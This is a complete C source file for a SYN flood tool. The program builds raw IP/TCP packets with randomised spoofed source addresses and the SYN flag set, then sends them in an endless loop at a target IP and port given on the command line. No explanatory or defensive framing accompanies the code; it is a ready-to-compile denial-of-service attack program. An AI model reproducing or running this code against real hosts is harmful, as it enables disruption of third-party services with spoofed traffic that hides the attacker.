#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h> 
#include <fcntl.h>
#include <signal.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int sockfd;
static int alive = -1;

char dst_ip[16] = { 0 };
int dst_port;

struct ip{
	unsigned char       hl;
	unsigned char       tos;
	unsigned short      total_len;
	unsigned short      id;
	unsigned short      frag_and_flags;
	unsigned char       ttl;
	unsigned char       proto;
	unsigned short      checksum;
	unsigned int        sourceIP;
	unsigned int        destIP;
};
	
struct tcphdr{
	unsigned short      sport;
	unsigned short      dport;
	unsigned int        seq;
	unsigned int        ack;
	unsigned char       lenres;
	unsigned char       flag;
	unsigned short      win;
	unsigned short      sum;
	unsigned short      urp;
};

struct pseudohdr
{
	unsigned int	    saddr;
	unsigned int 	    daddr;
	char                zero;
	char                protocol;
	unsigned short      length;
};

unsigned short checksum (unsigned short *buffer, unsigned short size)     
{  

	unsigned long cksum = 0;
	
	while(size > 1)
	{
		cksum += *buffer++;
		size  -= sizeof(unsigned short);
	}
	
	if(size)
	{
		cksum += *(unsigned char *)buffer;
	}
	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	
	return((unsigned short )(~cksum));
}

void sig_int(int signo)
{
	alive = 0;
}

void send_synflood(struct sockaddr_in *addr)
{ 
	char buf[100], sendbuf[100];
	int len;
	struct ip ip;
	struct tcphdr tcp;
	struct pseudohdr pseudoheader;

	len = sizeof(struct ip) + sizeof(struct tcphdr);
	srand((unsigned) time(NULL));
	
	while(alive)
	{
		ip.hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
		ip.tos = 0;
		ip.total_len = htons(len);
		ip.id = rand()%64+1;
		ip.frag_and_flags = 0x40;
		ip.ttl = rand()%32+64;
		ip.proto = IPPROTO_TCP;
		ip.checksum = 0;
		ip.sourceIP = rand();
		ip.destIP = inet_addr(dst_ip);
		
		bzero(buf, sizeof(buf));
		memcpy(buf , &ip, sizeof(struct ip));
		ip.checksum = checksum((u_short *) buf, sizeof(struct ip));

		tcp.sport = htons(rand()%16383+49152);
		tcp.dport = htons(dst_port);
		tcp.seq = htonl(rand()%90000000+2345); 
		tcp.ack = 0; 
		tcp.lenres = (sizeof(struct tcphdr)/4<<4|0);
		tcp.flag = 0x02;
		tcp.win = htons(rand()%1024+1024);  
		tcp.sum = 0;
		tcp.urp = 0;

		pseudoheader.zero = 0;
		pseudoheader.protocol = IPPROTO_TCP;
		pseudoheader.length = htons(sizeof(struct tcphdr));
		pseudoheader.daddr = inet_addr(dst_ip);
		pseudoheader.saddr = ip.sourceIP;

		bzero(buf, sizeof(buf));
		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
		tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip, sizeof(struct ip));
		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));

		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0)
		{
			perror("sendto()");
		}
		else
		{
			printf(".\n");
		}
	}
}

int main(int argc, char *argv[])
{
	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	alive = 1;

	signal(SIGINT, sig_int);

	if(argc < 3)
	{
		printf("usage: syn <IPaddress> <Port>\n");
		exit(1);
	}

	strncpy(dst_ip, argv[1], 16);
	dst_port = atoi(argv[2]);

	bzero(&addr, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);
	addr.sin_addr.s_addr = inet_addr(dst_ip);

	if( dst_port < 0 || dst_port > 65535 )
	{
		printf("Port Error\n");
		exit(1);
	}

	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
	if (sockfd < 0)	   
	{
		perror("socket()");
		exit(1);
	}

	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
	{
		perror("setsockopt()");
		exit(1);
	}

	setuid(getpid());

	send_synflood(&addr);

	close(sockfd);

	return 0;
}